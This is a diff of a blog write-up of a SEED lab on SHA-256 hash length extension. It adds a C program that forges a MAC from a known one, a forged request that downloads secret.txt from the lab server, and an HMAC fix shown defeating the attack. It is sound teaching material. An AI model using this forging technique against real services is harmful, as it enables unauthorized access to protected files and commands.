@@ -44,7 +44,7 @@ The request to send to list the files on the server is as follows:
 http://www.seedlab-hashlen.com/?myname=IfeanyiUkadike&uid=1005&lstcmd=1&mac=d7b362c568eb7ec56b0a6f748c602610038e44cd9e3034f59d95ddcb40b61e3a
 ```
 
-**image**
+![task-1-a](https://github.com/iukadike/blog/assets/58455326/948a2244-389c-449b-9da4-dcaeee46589a)
 
 #### Download a file from the server
 
@@ -60,7 +60,7 @@ The request to send to download a file from the server is as follows:
 www.seedlab-hashlen.com/?myname=IfeanyiUkadike&uid=1005&myname=IfeanyiUkadike&uid=1005&lstcmd=1&download=secret.txt&mac=ab0424810a8d1dac9cca1a6190b4458cb96dee8f0b12728fe0e9b84c2c1f98ee
 ```
 
-**image**
+![task-1-b](https://github.com/iukadike/blog/assets/58455326/5ee2045b-2044-4413-abaf-dea4feeab7bd)
 
 
 <br>
@@ -161,7 +161,7 @@ if __name__ == '__main__':
     main()
 ```
 
-**image**
+![task-2](https://github.com/iukadike/blog/assets/58455326/702d7d66-31a8-493d-af78-282562d4af1b)
 
 
 <br>
@@ -172,4 +172,130 @@ This task involves generating a valid MAC for a URL without knowing the MAC key.
 
 Assume that we know the MAC of a valid request R, and we also know the size of the MAC key. Our job is to forge a new request based on R, while still being able to compute the valid MAC.
 
-Given the original message M="This is a test message" and its MAC value, we will show how to add a message "Extra message" to the end of the padded M, and then compute its MAC, without knowing the secret MAC key.
+The valid request will be: 
+
+```html
+http://www.seedlab-hashlen.com/?myname=IfeanyiUkadike&uid=1005&lstcmd=1&mac=d7b362c568eb7ec56b0a6f748c602610038e44cd9e3034f59d95ddcb40b61e3a
+```
+
+The program below can be used to compute the MAC for the new message:
+
+```c
+/*length_ext.c*/
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <openssl/sha.h>
+
+int main(int argc, const char*argv[])
+{
+    int i;
+    unsigned char buffer[SHA256_DIGEST_LENGTH];
+    SHA256_CTX c;
+    
+    SHA256_Init(&c);
+    for (i=0; i<64; i++) {
+        SHA256_Update(&c, "*", 1);
+    }
+    
+    // MAC of the original message M (padded)
+    // sha256sum of M = d7b362c568eb7ec56b0a6f748c602610038e44cd9e3034f59d95ddcb40b61e3a
+    c.h[0] = htole32(0xd7b362c5);
+    c.h[1] = htole32(0x68eb7ec5);
+    c.h[2] = htole32(0x6b0a6f74);
+    c.h[3] = htole32(0x8c602610);
+    c.h[4] = htole32(0x038e44cd);
+    c.h[5] = htole32(0x9e3034f5);
+    c.h[6] = htole32(0x9d95ddcb);
+    c.h[7] = htole32(0x40b61e3a);
+    
+    // Append additional message
+    SHA256_Update(&c, "&download=secret.txt", 20);
+    SHA256_Final(buffer, &c);
+    
+    for(i = 0; i < 32; i++) {
+        printf("%02x", buffer[i]);
+    }
+    printf("\n");
+    return 0;
+}
+```
+
+When the program is compiled and run, the below screenshot shows the result
+
+![task-3-a](https://github.com/iukadike/blog/assets/58455326/a20c3a54-cea2-4427-b4a5-d436c805f043)
+
+- padding calculated previously = %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%70
+- MAC for the new message = d8cbee3e728e1500281598e707935981ae37bd9b2f06bf93da0ecf723189ba6c
+
+The hash length extension attack will be constructed as:
+
+```html
+www.seedlab-hashlen.com/?myname=IfeanyiUkadike&uid=1005&myname=IfeanyiUkadike&uid=1005&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%70&download=secret.txt&mac=d8cbee3e728e1500281598e707935981ae37bd9b2f06bf93da0ecf723189ba6c
+```
+
+From the screenshot below, we can see that the attack is successful
+
+![task-3-b](https://github.com/iukadike/blog/assets/58455326/46e91213-80a5-4685-8654-31696439df87)
+
+
+<br>
+
+### Attack Mitigation using HMAC
+
+The previous tasks have shown the damage that is caused when a developer computes a MAC in an insecure way by concatenating the key and the message.
+This task focuses on fixing the mistake made by the developer.
+
+The standard way to calculate MACs is to use HMAC.
+
+Assuming that the chosen key is 123456, the HMAC can be computed in the following program:
+
+```python
+#!/bin/env python3
+import hmac
+import hashlib
+
+key='123456'
+message='lstcmd=1'
+
+mac = hmac.new(bytearray(key.encode('utf-8')), msg=message.encode('utf-8', 'surrogateescape'), digestmod=hashlib.sha256).hexdigest()
+print(mac)
+```
+
+By modifying the "verify mac() function" in the server's program, we can instruct the program to make use of Python's hmac module to calculate the MAC.
+
+#### List files on the server
+After modifying the server's program and restarting the container:
+
+The MAC is calculated by using python's hmac module
+
+```python
+#!/bin/env python3
+import hmac
+import hashlib
+
+key = "xciujk"
+message = "myname=IfeanyiUkadike&uid=1005&lstcmd=1"
+
+mac = hmac.new(bytearray(key.encode('utf-8')), msg=message.encode('utf-8', 'surrogateescape'), digestmod=hashlib.sha256).hexdigest()
+print(mac)
+```
+
+![task-4-a](https://github.com/iukadike/blog/assets/58455326/f71e9045-c6a1-4677-a191-dea13727604a)
+
+The request to send to list the files on the server is as follows:
+
+```html
+http://www.seedlab-hashlen.com/?myname=IfeanyiUkadike&uid=1005&lstcmd=1&mac=dc96e025b47bf9d52fdd6c41b9284a6c96e82a3f182859900b5a543fddef70d6
+```
+
+![task-4-b](https://github.com/iukadike/blog/assets/58455326/460e1820-7d67-42cf-8ebc-380ee76b3786)
+
+However, when I try to carry out a hash length extension attack, it fails.
+
+![task-4-c](https://github.com/iukadike/blog/assets/58455326/dc4e3995-bdc7-4534-8f0a-d595d217fcd4)
+
+This happens because HMAC does not append the message to the key when calculating MACs, but ensures that the key is mixed with the message in a way that prevents an attacker from easily extending the message. 
+
+This means that the attacker would need to know the key in order to produce the correct hash value after extending the message. Since the secret key is not known to the attacker, they cannot compute the correct hash value for the extended message.
+
+Thanks for reading...
